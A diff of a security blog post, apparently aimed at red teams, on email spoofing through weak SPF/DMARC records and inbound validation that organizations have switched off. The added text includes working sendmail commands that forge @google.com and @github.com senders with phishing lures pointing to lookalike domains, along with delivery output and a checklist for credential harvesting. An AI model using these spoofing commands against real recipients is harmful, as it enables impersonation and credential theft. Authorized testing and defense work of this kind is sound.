@@ -81,7 +81,7 @@ Google has the big data and the heuristics to provide anti-spam and anti-phishin
 
 ## The Bad
 
-If you start checking the SPF and DMARC records for a lot of organizations you'll notice weak configurations are plentiful. SPF soft fails are widespread and DMARC policies other than `reject/quarantine` are quite common.
+If you start checking the SPF and DMARC records for a lot of organizations you'll notice weak configurations are plentiful. SPF soft fails are widespread and DMARC policies other than `reject` and `quarantine` are quite common.
 
 Even `github.com` has an SPF soft fail and a `none` DMARC policy:
 
@@ -98,17 +98,56 @@ SPF records can be hard to keep accurate when third parties can't provide an ext
 
 Rather than risk legitimate emails getting blocked, it appears many organizations favor lax email validation rules.
 
-Note that even when main domains, such as `contoso.com`, have SPF and DMARC adequately configured, the organization likely has other domains. What do the DNS records look like for `contoso-sales.com`?
+As a result, we can probably send emails as `@github.com` to most people who are not behind a decent email filter from Microsoft or Google.
+
+_Note that even when main domains, such as `contoso.com`, have SPF and DMARC adequately configured, the organization likely has other domains. What do the DNS records look like for `contoso-sales.com`?_
 
 ## The Ugly
 
-A number of organizations have SPF, DKIM and DMARC validation turned off on their inbound email filtering systems (remember that it is up to recipients to validate inbound emails). I can't give any meaningful metric as I've only sampled a negligible number in the grand scheme of things, but I've seen it enough to believe that the possibility should not be discarded by red teams and pentesters.
+Firstly, a number of organizations have SPF, DKIM and DMARC validation turned off on their inbound email filtering systems (remember that it is up to recipients to validate inbound emails). I can't give any meaningful metric as I've only sampled a negligible number in the grand scheme of things, but I've seen it enough to believe that the possibility should not be discarded by red teams and pentesters.
 
-Reasons for having inbound validation disabled range from the good old "it's the default configuration" to an explicit desire to have email "just work". Given the amount of misconfigured DNS records out there, it is not surprising that organizations would find legitimate, if invalid, inbound emails getting blocked.
+Reasons for having inbound validation disabled range from the good old "it's the default configuration" to an explicit desire to have email "just work". Given the amount of misconfigured DNS records out there, it's not surprising that organizations would find legitimate, if invalid, inbound emails getting blocked.
 
 Naturally, disabled validation leaves the organizations open to some clever phishing attacks impersonating trusted external sources.
 
-_Note that you will likely not be able to send emails from `@contoso.com` to another `@contoso.com` email address even if the SPF and DMARC records are poorly configured, and even if inbound email validation is disabled. Trying to deliver an internal email from an external source will usually fail._
+_Note that you will likely not be able to send emails from `@contoso.com` to another `@contoso.com` email address even if the SPF and DMARC records are poorly configured, and even if inbound email validation is disabled. Trying to deliver an internal email from an external source should usually fail._
+
+The easiest way to tell if an organisation is enforcing validation is to give it a spin. Contoso is actually enforcing DMARC and you can't send them an email from `@google.com`:
+
+```
+$ printf "Subject: Chrome Security Update\n\nAn important security update is available for Chrome. It is important that you update now https://www.google-chrome-update.com/download" | sendmail -i -t -v -f "security.update@google.com" -t "john.wick@contoso.com"
+...
+050 >>> MAIL From:<security.update@google.com>
+050 250 2.1.0 Sender ok
+050 >>> RCPT To:<john.wick@contoso.com>
+050 >>> DATA
+050 250 2.1.5 Recipient ok
+050 354 Enter mail, end with "." on a line by itself
+050 >>> .
+050 550 5.7.0 Email rejected per DMARC policy
+```
+
+Even then, GitHub and its DMARC `p=none` flies right through:
+
+```
+$ printf "Subject: GitHub Password Reset\n\nHey John, it's time to reset your GitHub password: https://github-account-manager.com/reset" | sendmail -i -t -v -f "security@github.com" -t "john.wick@contoso.com"
+...
+050 >>> MAIL From:<security.update@github.com>
+050 250 2.1.0 Sender ok
+050 >>> RCPT To:<john.wick@contoso.com>
+050 >>> DATA
+050 250 2.1.5 Recipient ok
+050 354 Enter mail, end with "." on a line by itself
+050 >>> .
+050 250 2.0.0 8xy123pkud-1 Message accepted for delivery
+```
+
+Spoofing GitHub lands directly into John Wick's Contoso inbox. His client even conveniently fetched the domain's `favicon`:
+
+![github spoof](https://alex.kaskaso.li/images/posts/dns-referer-attack2.png "github spoof"){: .center-image }
+
+Before you get too excited, I submitted multiple open bug bounty reports to various companies. The reports were acknowledged, thanks were given, but these configurations are intentional and will not be fixed.
+
 
 ## Bypassing External Filters (Sometimes)
 
@@ -137,10 +176,10 @@ If we wanted to receive email responses to these phishing attempts, we could try
 
 If you're a red team:
 
-* Enumerate your target's parent and subsidiary companies and their domains, as well as any external SAAS they may use.
+* Enumerate your target's parent and subsidiary companies and their domains, as well as any external SaaS they may use.
 * Identify domains with weak SPF and DMARC configurations.
 * You may be able to bypass external filters by spoofing parent and subsidiary companies.
-* You may be able to spoof a trusted external SAAS to harvest credentials or entice a download (note: there are legal considerations around spoofing a third-party unrelated to your engagement).
+* You may be able to spoof a trusted external SaaS to harvest credentials or entice a download (note that there are legal considerations around spoofing a third-party unrelated to your engagement).
 
 If you're an organization:
 
